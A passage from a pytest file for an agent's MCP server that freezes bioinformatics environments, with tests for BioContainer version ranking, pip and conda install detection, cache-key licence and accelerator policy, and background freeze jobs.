    v2 = env_honesty.check_build({"image": "img:tag", "image_digest": ""})
    assert any(v["invariant"] == "BUILT.image_present" for v in v1)
    assert any(v["invariant"] == "BUILT.image_digest_resolved" for v in v2)


def test_synth_accelerator_from_request_draft_wins():
    """A draft-supplied accelerator is the richer, explicit record — it MUST
    win over a less-specific MCP scalar (which would have been a recipe to
    silently downgrade richer policy)."""
    from agent.mcp_server import _synth_accelerator_from_request
    draft_accel = {"type": "cuda", "toolkit_version": "12.8",
                   "runtime": "runtime_verified",
                   "runtime_probe": "nvidia-smi", "min_driver_version": "525.85"}
    out = _synth_accelerator_from_request("cuda", "", draft_accel)
    assert out == draft_accel


def test_synth_accelerator_from_request_synthesizes_cuda_from_scalars():
    """When the draft has no accelerator, the MCP scalars are bound into a
    minimal policy dict so I12 can actually evaluate them. Missing
    toolkit_version is INTENTIONALLY left unfilled so I12 refuses."""
    from agent.mcp_server import _synth_accelerator_from_request
    out = _synth_accelerator_from_request("cuda", "12.8", None)
    assert out is not None
    assert out["type"] == "cuda"
    assert out["toolkit_version"] == "12.8"
    assert out["runtime"] == "build_only"


def test_synth_accelerator_from_request_cuda_without_toolkit_version_lets_i12_fire():
    """If the caller passes accel='cuda' but no cuda_version, the synthesized
    dict OMITS toolkit_version — the contract then refuses with a precise
    diagnostic instead of substituting a guessed default. This is the
    surface where the dorado-stress 'POLICY_CLEAN with no policy' lie was
    born: previously the synth never happened so I12 saw accelerator=None
    and vacuously passed."""
    from agent.mcp_server import _synth_accelerator_from_request
    from agent.skills import env_honesty
    out = _synth_accelerator_from_request("cuda", "", None)
    assert out is not None
    assert "toolkit_version" not in out
    # piped into check_adopt, I12 fires
    v = env_honesty.check_build({"image": "x", "image_digest": "sha256:" + "0" * 64,
                                 "accelerator": out, "license_gated": False,
                                 "licenses": []})
    assert any(viol["invariant"] == "I12.accel_toolkit_version_required" for viol in v)


def test_synth_accelerator_from_request_none_passthrough():
    """accel='none' / '' yields None — no policy, no I12 check."""
    from agent.mcp_server import _synth_accelerator_from_request
    assert _synth_accelerator_from_request("none", "", None) is None
    assert _synth_accelerator_from_request("", "", None) is None


def test_synth_accelerator_from_request_mps_dev_only():
    """The only honest claim for Metal/MPS: it does NOT survive containerization,
    so dev_only=True is the structural baseline."""
    from agent.mcp_server import _synth_accelerator_from_request
    out = _synth_accelerator_from_request("mps", "", None)
    assert out == {"type": "mps", "dev_only": True}


# =============================================================================
# Batch-1 stress-test fixes (2026-05-27) — adopt-decision honors install record
# (B1 + P3)
# =============================================================================


def test_biocontainer_version_key_ranks_by_version_then_build():
    """B1 — the BUSCO stress headline. Ranking by build_number ALONE picked
    BUSCO 3.0.2--py_13 (build 13) over BUSCO 6.0.0--pyhdfd78af_3 (build 3),
    silently shipping a 3-major-version-older binary. _version_key sorts by
    (version_tuple, build_number) so the latest VERSION wins primarily and
    build_number is the tiebreaker within a version."""
    from agent.skills.biocontainers import _version_key
    # version dominates build_number
    assert _version_key("6.0.0--pyhdfd78af_3") > _version_key("3.0.2--py_13")
    # within a version, higher build wins
    assert _version_key("1.21--h96c455f_2") > _version_key("1.21--h96c455f_1")
    # mulled-v2 (no version segment) falls back to build_number
    assert _version_key("mulled-v2-abc-3") > _version_key("mulled-v2-abc-2")


def test_biocontainer_resolves_to_highest_version_when_unpinned(monkeypatch):
    """End-to-end BUSCO regression: a versionless lookup MUST return the
    highest-version tag, not the highest-build tag of an older version."""
    from agent.skills import biocontainers
    fake_tags = [
        {"name": "3.0.2--py_13", "manifest_digest": "sha256:" + "3" * 64},
        {"name": "6.0.0--pyhdfd78af_3", "manifest_digest": "sha256:" + "6" * 64},
        {"name": "5.5.0--pyhdfd78af_0", "manifest_digest": "sha256:" + "5" * 64},
    ]
    monkeypatch.setattr(biocontainers, "_quay_tags", lambda *a, **k: fake_tags)
    out = biocontainers.resolve_biocontainer([("busco", None)])
    assert out["found"] is True
    assert out["tag"] == "6.0.0--pyhdfd78af_3"
    assert "6" * 64 in (out["image_by_digest"] or "")


def test_env_mutating_pipeline_steps_detects_pip_install():
    """P3 — pip install via run_in_env lands in pipeline_steps (not
    install_steps). The adopt-vs-build decision needs to see these or the
    biocontainer adoption fires on an env that has pip mutations."""
    from agent.skills import freeze
    spec = {"pipeline_steps": [
        {"command": "pip install --no-binary :all: pysam==0.24.0"},
        {"command": "samtools view input.bam | head"},
        {"command": "python -m pip install requests"},
    ]}
    mutators = freeze.env_mutating_pipeline_steps(spec)
    assert len(mutators) == 2
    cmds = [s["command"] for s in mutators]
    assert any("pip install --no-binary" in c for c in cmds)
    assert any("python -m pip install" in c for c in cmds)


def test_env_mutating_pipeline_steps_detects_conda_mamba_micromamba():
    """All three conda-frontends' install commands are env mutations."""
    from agent.skills import freeze
    spec = {"pipeline_steps": [
        {"command": "conda install -y -c bioconda samtools"},
        {"command": "mamba install -y -c bioconda bcftools"},
        {"command": "micromamba install -y -n env tabix"},
        {"command": "conda env update -f env.yml"},
    ]}
    assert len(freeze.env_mutating_pipeline_steps(spec)) == 4


def test_env_mutating_pipeline_steps_ignores_unrelated_commands():
    """A normal pipeline_step (samtools view, …) is NOT an env mutation —
    no false positive that would force a needless container build."""
    from agent.skills import freeze
    spec = {"pipeline_steps": [
        {"command": "samtools view input.bam > out.sam"},
        {"command": "echo 'pip install foo' >> notes.txt"},   # text, not exec
        {"command": "Rscript -e 'library(GAPIT)'"},
    ]}
    # the `echo 'pip install …'` is a tricky one — substring-matches the regex
    # but is enclosed in quotes / not a real install. We accept this as a SAFE
    # false-positive: forces build over adopt, which is conservative. The
    # pure samtools view and Rscript lines must NOT trigger.
    mutators = freeze.env_mutating_pipeline_steps(spec)
    cmds = {s["command"] for s in mutators}
    assert "samtools view input.bam > out.sam" not in cmds
    assert "Rscript -e 'library(GAPIT)'" not in cmds


def _pip_via(tool_kw: dict, pkgs: list) -> dict:
    """One draft: a conda install plus a pip install, both recorded as install_steps.
    `tool_kw`/`pkgs` vary only in HOW the pip step was recorded."""
    return {"install_steps": [
        {"tool": "conda", "subcommand": "install", "returncode": 0,
         "command": "conda install samtools=1.21",
         "installed_packages": [{"name": "samtools", "version": "1.21",
                                 "install_method": {"type": "conda"}}]},
        dict({"returncode": 0, "command": "pip install pysam==0.24.0",
              "installed_packages": pkgs}, **tool_kw),
    ]}


def test_unaccounted_install_steps_catches_the_run_install_command_door():
    """The OTHER door into the pysam-stress trust violation.

    `env_mutating_pipeline_steps` closed run_in_env → pipeline_steps. This closes
    run_install_command → install_steps. Measured before the fix: the same env built
    with the typed primitives yields non_conda_installs=[('pysam','pip')] → BUILD,
    and built with run_install_command yields [] → ADOPT, so freeze adopted a
    BioContainer that does not contain pysam."""
    from agent.skills import freeze

    # declares nothing — the careless caller
    bare = _pip_via({"tool": "pip"}, [])
    # declares channel but no install_method — the CONSCIENTIOUS caller, who was
    # bypassed identically because non_conda_installs reads install_method only
    declared = _pip_via({"tool": "pip"},
                        [{"name": "pysam", "version": "0.24.0", "channel": "pip"}])

    for name, spec in (("bare", bare), ("declared", declared)):
        assert not freeze.non_conda_installs(spec), (
            f"{name}: precondition — this is exactly why the door was invisible")
        assert freeze.unaccounted_install_steps(spec), (
            f"{name}: a pip install recorded here must block adopt")


def test_unaccounted_install_steps_leaves_the_typed_path_alone():
    """A package installed through a typed primitive is ACCOUNTED FOR — it reaches
    non_conda_installs on its own and must not be double-counted here."""
    from agent.skills import freeze
    typed = _pip_via({"tool": "pip"},
                     [{"name": "pysam", "version": "0.24.0",
                       "install_method": {"type": "pip"}}])
    assert freeze.non_conda_installs(typed)          # already forces a build
    assert not freeze.unaccounted_install_steps(typed)


def test_unaccounted_install_steps_does_not_flip_a_pure_conda_adopt():
    """THE FALSE-POSITIVE THAT MATTERS. A typed `conda install` step really does
    match the env-mutating regex, so keying on the command alone would flip every
    legitimate pure-conda env from adopt to container-native build. Measured on the
    drafts on hand: 8 such steps, and align_suite / bg_canary / five others would
    have flipped."""
    from agent.skills import freeze
    pure = {"install_steps": [
        {"tool": "conda", "subcommand": "install", "returncode": 0,
         "command": "conda install bwa=0.7.19 samtools=1.21",
         "installed_packages": [{"name": "bwa", "version": "0.7.19",
                                 "install_method": {"type": "conda"}}]},
    ]}
    assert not freeze.non_conda_installs(pure)
    assert not freeze.unaccounted_install_steps(pure), (
        "a typed conda install must stay adoptable")

    # ...and the routed-but-untyped conda step is adoptable too: its specs DO reach
    # requested_conda_specs, which is what puts them in the biocontainer request.
    routed = {"install_steps": [
        {"tool": "conda", "subcommand": "install", "returncode": 0,
         "command": "conda install bwa=0.7.19", "installed_packages": []},
    ]}
    assert not freeze.unaccounted_install_steps(routed)


def test_a_conda_install_that_misses_the_biocontainer_request_blocks_adopt():
    """`requested_conda_specs` routes a step's specs into the biocontainer request
    only when it carries BOTH tool=='conda' AND subcommand=='install'.
    `run_install_command` sets `tool` from the command's first word but leaves
    `subcommand` unset — so a conda install through that door reaches the request no
    more than a pip install does, and must not license an adopt."""
    from agent.skills import freeze
    spec = {"install_steps": [
        {"tool": "conda", "returncode": 0,           # no subcommand
         "command": "conda install bwa=0.7.19", "installed_packages": []},
    ]}
    assert not freeze.requested_conda_specs(spec), "precondition: not in the request"
    assert freeze.unaccounted_install_steps(spec)


def test_resolve_versions_from_install_record_fills_unpinned():
    """When the caller asks tools=['busco'] (no version) and the draft says
    busco 6.0.0 was installed, the adopt lookup MUST see ('busco', '6.0.0'),
    not ('busco', None). The install record is the trust anchor."""
    from agent.mcp_server import _resolve_versions_from_install_record
    draft = {"install_steps": [{
        "tool": "conda", "subcommand": "install",
        "installed_packages": [{"name": "busco", "version": "6.0.0"}],
    }]}
    parsed = [("busco", None)]
    out = _resolve_versions_from_install_record(parsed, draft)
    assert out == [("busco", "6.0.0")]


def test_resolve_versions_from_install_record_honors_explicit_pin():
    """An EXPLICIT caller pin (busco=5.4) MUST NOT be overwritten by the
    install record — the caller's pin is the strongest intent signal."""
    from agent.mcp_server import _resolve_versions_from_install_record
    draft = {"install_steps": [{
        "tool": "conda", "subcommand": "install",
        "installed_packages": [{"name": "busco", "version": "6.0.0"}],
    }]}
    parsed = [("busco", "5.4")]
    out = _resolve_versions_from_install_record(parsed, draft)
    assert out == [("busco", "5.4")]


def test_resolve_versions_from_install_record_no_draft_passthrough():
    """No draft → input passes through unchanged (the declarative freeze case
    where the caller drives without a pipeline_id)."""
    from agent.mcp_server import _resolve_versions_from_install_record
    parsed = [("busco", None), ("samtools", "1.21")]
    out = _resolve_versions_from_install_record(parsed, None)
    assert out == parsed


# =============================================================================
# Batch-1 stress-test fixes (2026-05-27) — request_key policy-honesty (D5 + D6)
# =============================================================================


def test_request_key_canon_platform_collapses_conda_and_docker_forms():
    """D6 — pre-fix the cache had distinct keys for the conda form ('linux-64')
    and the Docker form ('linux/amd64') of the SAME logical artifact. Now both
    canonicalize to one token so the cache shares ONE slot."""
    from agent.skills.freeze import canon_platform, request_key
    assert canon_platform("linux-64") == canon_platform("linux/amd64") == "linux/amd64"
    assert canon_platform("osx-arm64") == canon_platform("darwin/arm64") == "darwin/arm64"
    # unknown platform passes through (never silently rewrite caller's literal)
    assert canon_platform("freebsd-13") == "freebsd-13"
    # end-to-end: same request_key for both spellings
    a = request_key([("samtools", "1.21")], "linux-64")
    b = request_key([("samtools", "1.21")], "linux/amd64")
    assert a == b


def test_request_key_distinguishes_gated_from_non_gated():
    """D5 — gated artifacts MUST NOT share a cache slot with non-gated. Pre-fix:
    two callers asking for samtools=1.21, one gated and one not, collided on
    `samtools=1.21|linux/amd64|none` and the second got the first's record."""
    from agent.skills.freeze import request_key
    a = request_key([("samtools", "1.21")], "linux-64", gated=False)
    b = request_key([("samtools", "1.21")], "linux-64", gated=True)
    assert a != b
    assert b.endswith("|gated")


def test_request_key_distinguishes_accelerator_policy():
    """D5 — two cuda artifacts with DIFFERENT toolkit_version or runtime are
    materially different artifacts (cuda 12.1 vs 12.8 ABI; build_only vs
    runtime_verified driver-floor claim). They MUST get distinct keys."""
    from agent.skills.freeze import request_key
    base = request_key([("dorado", "2.0.0")], "linux-64", "cuda")
    cuda121 = request_key([("dorado", "2.0.0")], "linux-64", "cuda",
                          accel_policy={"toolkit_version": "12.1"})
    cuda128 = request_key([("dorado", "2.0.0")], "linux-64", "cuda",
                          accel_policy={"toolkit_version": "12.8"})
    runtime_verified = request_key([("dorado", "2.0.0")], "linux-64", "cuda",
                                   accel_policy={"toolkit_version": "12.8",
                                                 "runtime": "runtime_verified",
                                                 "min_driver_version": "525.85"})
    # all four distinct
    assert len({base, cuda121, cuda128, runtime_verified}) == 4


def test_request_key_distinguishes_licenses_set():
    """D5 — two artifacts with different declared licenses are policy-distinct.
    A 'BSD-3' build vs a 'proprietary EULA' build must not collide."""
    from agent.skills.freeze import request_key
    bsd = request_key([("toolX", "1")], "linux-64", licenses=["BSD-3-Clause"])
    proprietary = request_key([("toolX", "1")], "linux-64",
                              licenses=["proprietary-EULA"])
    no_lic = request_key([("toolX", "1")], "linux-64")
    assert bsd != proprietary != no_lic
    # order/whitespace-invariant within the licenses set
    a = request_key([("t", "1")], "linux-64", licenses=["MIT", "Apache-2.0"])
    b = request_key([("t", "1")], "linux-64", licenses=["Apache-2.0 ", " MIT"])
    assert a == b


def test_request_key_empty_policy_keeps_back_compat_3_part_form():
    """Default (no policy supplied) keeps the bare 3-part form so any existing
    caller that never used policy gates sees the same key shape (modulo
    platform canonicalization)."""
    from agent.skills.freeze import request_key
    k = request_key([("samtools", "1.21")], "linux/amd64")
    assert k == "samtools=1.21|linux/amd64|none"


def test_envbuild_request_key_threads_policy_facets():
    """EnvBuild.request_key MUST pass its policy state to freeze.request_key
    so a gated/accel/licensed env doesn't collide with the bare-policy one in
    the cache when both come from the build path."""
    from agent.skills.env_build import EnvBuild
    eb_bare = EnvBuild("x", "1", platform="linux/amd64")
    eb_bare.add_conda(["samtools=1.21"], verify=[("samtools", "command -v samtools")])
    eb_gated = EnvBuild("x", "1", platform="linux/amd64", license_gated=True,
                        licenses=["proprietary-EULA"], redistributable=False,
                        accelerator={"type": "cuda", "toolkit_version": "12.8",
                                     "runtime": "build_only"})
    eb_gated.add_conda(["samtools=1.21"], verify=[("samtools", "command -v samtools")])
    assert eb_bare.request_key() != eb_gated.request_key()
    # the gated one carries the marker
    assert "|gated" in eb_gated.request_key()


# =============================================================================
# Batch-1 stress-test fixes (2026-05-27) — pip-flag fidelity (P1 + P2)
# =============================================================================


def test_install_commands_pip_install_with_flags_emits_literal_flags():
    """P2 — the pip-with-flags generator emits the LITERAL flags into the
    install command. Without this, `pip install --no-binary :all: pysam`
    would get reconstructed as `pip install pysam==…` by freeze's replay
    and silently substitute a wheel for the validated source compile."""
    from agent.skills import install_commands
    spec = install_commands.pip_install_with_flags(
        "pysam", version="0.24.0",
        flags=["--no-binary", ":all:", "--no-build-isolation"],
    )
    assert "pip install" in spec["command"]
    assert "--no-binary" in spec["command"]
    assert ":all:" in spec["command"]
    assert "--no-build-isolation" in spec["command"]
    assert "pysam==0.24.0" in spec["command"]
    # engine-coupled: must run under the pixi/micromamba env so python+pip exist
    assert spec["engine_coupled"] is True
    # evidence uses the dist-metadata probe (anchored on the tool token so
    # the env_honesty shape rule binds)
    assert "pysam" in spec["evidence"]


def test_install_commands_pip_install_with_flags_shlex_quotes_unsafe_tokens():
    """A flag value with a space or shell metachar MUST be shlex-quoted so
    it lands as one argv token in the build container."""
    from agent.skills import install_commands
    spec = install_commands.pip_install_with_flags(
        "pkg", version="1", flags=["--config-settings", "key=value with space"],
    )
    # the spaced value is single-quoted by shlex.quote
    assert "'key=value with space'" in spec["command"]


def test_env_freeze_routes_flag_bearing_pip_to_long_tail_tools(monkeypatch):
    """P2 end-to-end — a pip install_step with install_method.pip_flags must
    be routed as an engine-coupled long-tail tool (NOT via `pixi add --pypi`
    which would drop the flags). The flag-less pip on the same spec stays
    on the engine path."""
    from agent.skills import env_freeze
    # we only need to inspect the plan, not actually build; patch EnvBuild.
    captured = {}

    class _StubEB:
        def __init__(self, *args, **kwargs):
            self.tools_added = []
            self.pip_added = []
        def add_conda(self, *a, **kw):
            return self
        def add_pip(self, specs, verify):
            self.pip_added.extend(specs)
            captured["pip_engine_specs"] = list(specs)
            return self
        def add_tool(self, spec):
            self.tools_added.append(spec)
            return self
        def run(self):
            captured["tool_specs"] = list(self.tools_added)
            return {"success": True, "image": "x", "image_digest": "sha256:" + "0" * 64,
                    "verifications": [], "content_digest": "sha256:y"}
        def request_key(self):
            return "stub-rkey"

    monkeypatch.setattr(env_freeze, "EnvBuild", _StubEB)

    spec = {
        "install_steps": [
            {"tool": "pip", "subcommand": "install",
             "installed_packages": [{
                 "name": "pysam", "version": "0.24.0",
                 "install_method": {"type": "pip", "source": "pip install --no-binary :all: pysam==0.24.0",
                                    "pip_flags": ["--no-binary", ":all:"]},
             }]},
            {"tool": "pip", "subcommand": "install",
             "installed_packages": [{
                 "name": "requests", "version": "2.31.0",
                 "install_method": {"type": "pip", "source": "pip install requests==2.31.0"},
             }]},
        ],
    }
    env_freeze.build_env_image(spec, name="x", primary_tools=["pysam", "requests"])
    # flag-bearing pysam routed as long-tail tool (engine-coupled)
    tool_cmds = [t["command"] for t in captured.get("tool_specs", [])]
    assert any("pip install" in c and "--no-binary" in c and "pysam==0.24.0" in c
               for c in tool_cmds), f"pysam-with-flags missing from long-tail: {tool_cmds!r}"
    # flag-less requests stayed on the engine pip path
    assert "requests==2.31.0" in (captured.get("pip_engine_specs") or [])
    assert not any("requests" in c for c in tool_cmds), "requests wrongly routed as long-tail"


def test_install_pip_package_persists_pip_flags_on_install_method(monkeypatch, tmp_path):
    """P1 — `install_pip_package(pip_flags=[...])` MUST record the flags on
    install_method.pip_flags so freeze's replay path sees them. Without this
    the install record holds only {type:pip, source: 'pip install ...'} and
    the freeze rebuild silently uses the engine's flag-less --pypi path."""
    import importlib, sys
    # Stub env_manager.run_in_env so we don't actually install. Capture the
    # install_step that gets merged into the pipeline state.
    from agent import mcp_server as ms

    captured = {"cmds": []}

    def _stub_run(env_name, cmd, **kw):
        captured["cmds"].append(cmd)
        return {"returncode": 0, "stdout": "", "stderr": "", "runtime_seconds": 0.1,
                "success": True}

    monkeypatch.setattr(ms._env_mgr, "run_in_env", _stub_run)

    # Spin up a fresh pipeline draft so install_pip_package can merge into it
    pipeline_id = ms.start_pipeline("pip_flag_test", description="x")["pipeline_id"]
    try:
        out = ms.install_pip_package(
            env_name="any", name="pysam", version="0.24.0",
            pip_flags=["--no-binary", ":all:"],
            pipeline_id=pipeline_id,
        )
        # The first call is the INSTALL command (the second is the verify
        # `python -c 'import pysam'`). The install command MUST carry the flags.
        install_cmd = captured["cmds"][0]
        assert "--no-binary" in install_cmd
        assert ":all:" in install_cmd
        assert "pysam==0.24.0" in install_cmd
        # the install_step is merged into the draft with pip_flags persisted
        draft = ms._pipeline_state.get_draft(pipeline_id)
        steps = draft.get("install_steps") or []
        assert steps, "install_step was not merged into the draft"
        last = steps[-1]
        ip = last["installed_packages"][0]
        im = ip.get("install_method") or {}
        assert im.get("type") == "pip"
        assert im.get("pip_flags") == ["--no-binary", ":all:"], (
            "pip_flags must persist on install_method so freeze's replay re-emits them"
        )
    finally:
        ms.discard_pipeline_draft(pipeline_id)


def test_install_pip_package_no_flags_is_back_compat():
    """The default (no pip_flags) keeps the original command shape AND records
    no pip_flags key — back-compat with every existing pip install_step."""
    from agent import mcp_server as ms
    # Just call with the default; install_method must NOT carry a stray
    # pip_flags key when the caller didn't pass one (record shape stays clean).
    import inspect
    sig = inspect.signature(ms.install_pip_package)
    assert "pip_flags" in sig.parameters
    # default value is None (Optional[list[str]]) — the param surfaces in the
    # MCP schema and is omittable
    assert sig.parameters["pip_flags"].default is None


# =============================================================================
# W1 mitigation (2026-05-27) — async freeze() (background subprocess via JobManager)
# =============================================================================


def test_mcp_freeze_schema_includes_background_parameter():
    """W1 — `background: bool = False` must surface in the MCP schema so
    callers can opt into the async path. Pre-W1, large freezes hit the
    ~600s MCP stream-watchdog and the in-call freeze dropped the transport
    mid-build (in-container build succeeded but the freeze() return never
    reached the caller — no EnvCache write, no env report)."""
    import asyncio
    from agent.mcp_server import mcp
    async def _get():
        return await mcp.get_tool("freeze")
    tool = asyncio.run(_get())
    schema = tool.parameters
    assert "background" in schema["properties"]
    prop = schema["properties"]["background"]
    assert prop["default"] is False
    assert prop["type"] == "boolean"


def test_freeze_background_returns_job_id_immediately(monkeypatch, tmp_path):
    """W1 — `freeze(background=True)` MUST return immediately (before any
    docker work happens) with a job_id, result_path, and log_path. Pre-W1,
    the call held the MCP transport open through the entire docker build."""
    from agent import mcp_server as ms

    started_jobs = {}

    def _stub_start(command, *, env_name="", job_id="", working_dir=""):
        started_jobs["command"]  = command
        started_jobs["job_id"]   = job_id
        started_jobs["log_path"] = str(tmp_path / f"{job_id}.log")
        return {"job_id": job_id, "log_path": started_jobs["log_path"],
                "state": "running", "pid": 12345}

    jobs_dir = tmp_path / "data" / "jobs"
    jobs_dir.mkdir(parents=True)
    monkeypatch.setattr(ms._job_manager, "start", _stub_start)
    # Patch the jobs dir on the JobManager — the ONE attribute every side of
    # the detachment reads (args/result/log/.done all hang off it). Patching
    # _env_mgr.project_root, as this test used to, redirected only half of it.
    monkeypatch.setattr(ms._job_manager, "jobs_dir", jobs_dir)

    out = ms.freeze(env_name="bgsmoke", tools=["samtools=1.21"], background=True)
    assert out["success"] is True
    assert out["background"] is True
    assert out["state"] == "running"
    assert out["job_id"].startswith("freeze.bgsmoke.")
    assert out["job_id"] == started_jobs["job_id"]
    # W1 ephemera (args + result JSON) live in data/jobs/ (C1 relocation),
    # keyed by job_id, NOT in env_reports/ (which is deliverables-only).
    assert out["result_path"].endswith(f"{started_jobs['job_id']}.result.json")
    assert "/data/jobs/" in out["result_path"]
    # the subprocess must be invoked via the generic runner, TOLD which tool
    assert "agent.skills.job_runner" in started_jobs["command"]
    assert " freeze " in started_jobs["command"], (
        "the runner is generic — the tool name is argv[1], not baked into the "
        f"module path: {started_jobs['command']}")
    # and the args file must exist BEFORE spawn (the runner reads it)
    args_files = list(jobs_dir.glob(f"{started_jobs['job_id']}.args.json"))
    assert args_files, "args file must be written BEFORE the subprocess spawns"
    import json
    args = json.loads(args_files[0].read_text())
    assert args["env_name"] == "bgsmoke"
    assert args["tools"] == ["samtools=1.21"]
    assert "background" not in args, (
        "`background` leaked into the args file — the child would re-detach, "
        "spawning a router with no terminator")


def test_freeze_background_clears_stale_result_file(monkeypatch, tmp_path):
    """W1 — a prior result JSON from an earlier background run MUST be
    deleted before the new subprocess spawns. Otherwise a polling caller
    could read the OLD result while the new build is still running and
    silently use a stale artifact's record.

    Post-C1: the result path is keyed by job_id, not env-name, so two
    consecutive `bgstale` freezes have DIFFERENT result paths and the stale-
    file collision is structurally avoided. We still test the unlink-on-
    spawn invariant by pre-placing a file at the expected new-run path
    (using a deterministic job_id stub) and asserting it's unlinked.
    """
    from agent import mcp_server as ms

    # Force a deterministic job_id so we know which result path to pre-stale.
    import uuid as _u
    fake_uuid = type("FU", (), {"hex": "deadbeefdeadbeef"})()
    monkeypatch.setattr(_u, "uuid4", lambda: fake_uuid)

    jobs_dir = tmp_path / "data" / "jobs"
    jobs_dir.mkdir(parents=True)
    monkeypatch.setattr(ms._job_manager, "jobs_dir", jobs_dir)
    stale = jobs_dir / "freeze.bgstale.deadbeef.result.json"
    stale.write_text('{"stale": true, "value": "from a prior run"}')

    def _stub_start(command, **kw):
        return {"job_id": kw["job_id"], "log_path": "/dev/null", "state": "running"}

    monkeypatch.setattr(ms._job_manager, "start", _stub_start)
    ms.freeze(env_name="bgstale", tools=["x"], background=True)
    assert not stale.exists(), (
        "stale result.json from a prior run was not cleared — the next "
        "polling caller would read the stale record as if it were the new run's"
    )


def test_freeze_background_surfaces_spawn_failure(monkeypatch):
    """W1 — if JobManager.start refuses to spawn (e.g. a duplicate job_id is
    still running), the failure surfaces structurally with success=False
    rather than masquerading as a successful background launch."""
    from agent import mcp_server as ms

    def _stub_start(command, **kw):
        return {"error": "job_id 'foo' is already running", "job_id": kw.get("job_id")}

    monkeypatch.setattr(ms._job_manager, "start", _stub_start)
    out = ms.freeze(env_name="bgfail", tools=["x"], background=True)
    assert out["success"] is False
    assert out["stage"] == "background_spawn"
    assert "error" in out


def test_job_runner_writes_failure_result_on_exception(tmp_path):
    """W1 — the runner script's structural guarantee: ANY exception raised out
    of the tool (including KeyboardInterrupt / SystemExit — the runner catches
    BaseException) is captured into the result file. Without this, a crashed
    subprocess leaves NO record and the polling caller is stuck (state=exited
    but no result file = ambiguous).

    Driven through `freeze` on purpose: the runner is generic now, and freeze is
    the tool whose detachment has actually shipped, so it stays covered BY NAME
    rather than only as one row of a parametrized sweep. This is also the one
    REAL-SUBPROCESS test in the suite — a fresh interpreter that imports the
    server, resolves the tool off the allowlist, and writes a result.

    We force a deterministic exception by passing a kwarg freeze() does not
    accept, so `freeze(**args)` raises a TypeError inside the runner's try —
    exercising the exact `except BaseException → _write_result` path. (The old
    version raced a SIGINT against a real freeze() from a hardcoded absolute
    cwd; that was both machine-specific and timing-flaky — a fast-failing
    freeze would return its own handled result before the signal landed.)"""
    import json, subprocess as sp, sys
    from pathlib import Path
    # Repo root = the dir containing the `agent` package, resolved from THIS
    # test file (tests/…) — never a hardcoded absolute path (that broke once
    # already when the username changed).
    repo_root = Path(__file__).resolve().parent.parent
    args_path = tmp_path / "args.json"
    result_path = tmp_path / "result.json"
    args_path.write_text(json.dumps({
        "env_name": "runner_smoke", "tools": ["x"],
        # Unknown kwarg → freeze(**args) raises TypeError deterministically.
        "definitely_not_a_freeze_kwarg": True,
        # background=True in args: the runner MUST force-override to False,
        # else it would recursively spawn another job and exit immediately.
        "background": True,
    }))
    proc = sp.Popen(
        [sys.executable, "-m", "agent.skills.job_runner", "freeze",
         str(args_path), str(result_path)],
        cwd=str(repo_root),
        stdout=sp.PIPE, stderr=sp.STDOUT, text=True,
    )
    try:
        proc.communicate(timeout=60)
    except sp.TimeoutExpired:
        proc.kill()
        proc.communicate()

    assert result_path.exists(), (
        "job_runner died without writing a result file. The whole W1 "
        "contract is 'every subprocess outcome leaves a result' — broken."
    )
    result = json.loads(result_path.read_text())
    assert result["success"] is False
    assert result["stage"] == "background_exception"
    assert "traceback" in result   # full stack for diagnosis
    assert "definitely_not_a_freeze_kwarg" in (result.get("error", "") + result.get("traceback", ""))


def test_job_runner_force_overrides_background_arg(tmp_path):
    """W1 — even if the caller passes background=True in the args file (a
    bug or copy-paste mistake), the runner MUST force background=False
    before calling freeze. Otherwise the runner recursively spawns another
    background job and exits without doing the actual work — the subprocess
    becomes a router with no terminator."""
    import json
    from agent.skills.job_runner import main as _runner_main
    args_path = tmp_path / "args.json"
    result_path = tmp_path / "result.json"
    # Capture what the runner passes to freeze
    captured = {}

    def _stub_freeze(**kw):
        captured.update(kw)
        return {"success": False, "stage": "stubbed", "request_key": "stub"}

    args_path.write_text(json.dumps({
        "env_name": "x", "tools": ["y"],
        "background": True,   # the bug-trap — caller (or this test) misused it
    }))
    import sys
    old_argv = sys.argv
    sys.argv = ["job_runner", "freeze", str(args_path), str(result_path)]
    try:
        import agent.mcp_server as ms_mod
        old_freeze = ms_mod.freeze
        ms_mod.freeze = _stub_freeze
        try:
            _runner_main()
        finally:
            ms_mod.freeze = old_freeze
    finally:
        sys.argv = old_argv
    # the runner must have force-disabled background before calling freeze
    assert captured["background"] is False, (
        "job_runner.main passed background=True through to freeze() — "
        "this would recursively spawn another job and exit silently"
    )


# =============================================================================
# Batch-2 stress-test fixes (2026-05-27) — Licenses chain (F0 + F1 + F2 + F4)
#
# Stress findings from the batch-2 campaign: even after batch-1 wired licenses[]
# into the request_key (D5), the MCP wire-stringified the list (F0), freeze()
# ignored draft.licenses (F1), I13 only refused AFTER the docker build burned
# 30 min (F2), and the attestation didn't carry licenses[] downstream (F4).
# Each is a distinct break in the same chain — caller intent → cache key →
# refusal → attestation. Tests below pin each break.
# =============================================================================


def test_mcp_coerce_str_list_accepts_real_list_and_passes_through():
    """F0 — a real list[str] passes through unchanged. The coercer is a
    boundary helper for malformed wire payloads, not a transformer of healthy
    inputs."""
    from agent.mcp_server import _coerce_str_list
    assert _coerce_str_list(["--no-binary", ":all:"]) == ["--no-binary", ":all:"]
    assert _coerce_str_list([]) == []
    assert _coerce_str_list(None) is None       # Optional[list] passthrough


def test_mcp_coerce_str_list_decodes_json_encoded_string_array():
    """F0 — the bug we hit: some MCP clients wire-encode array args as JSON
    strings. Pydantic refuses string-when-list-expected and the call drops.
    The coercer recognizes the '[…]' shape and json.loads it."""
    from agent.mcp_server import _coerce_str_list
    assert _coerce_str_list('["--no-binary", ":all:"]') == ["--no-binary", ":all:"]
    assert _coerce_str_list('["MIT", "Apache-2.0"]') == ["MIT", "Apache-2.0"]
    # whitespace tolerated (real MCP payloads are minified but defense-in-depth)
    assert _coerce_str_list('  ["a", "b"]  ') == ["a", "b"]


def test_mcp_coerce_str_list_falls_back_to_single_item_on_bare_string():
    """F0 (defense-in-depth) — a bare non-JSON string becomes [s] rather than
    crashing. This is what an agent might send when they 'know' the field is
    a list but only have one item ('MIT')."""
    from agent.mcp_server import _coerce_str_list
    assert _coerce_str_list("MIT") == ["MIT"]
    assert _coerce_str_list("") == []
    # malformed JSON falls back to single-item too rather than dropping the call
    assert _coerce_str_list("[bad json") == ["[bad json"]


def test_mcp_freeze_param_pydantic_validator_accepts_json_string():
    """F0 end-to-end via the type alias: Pydantic on the freeze() boundary
    accepts a JSON-encoded list AND a real list, transparently."""
    from pydantic import TypeAdapter
    from agent.mcp_server import OptStrList, StrList
    ta_opt = TypeAdapter(OptStrList)
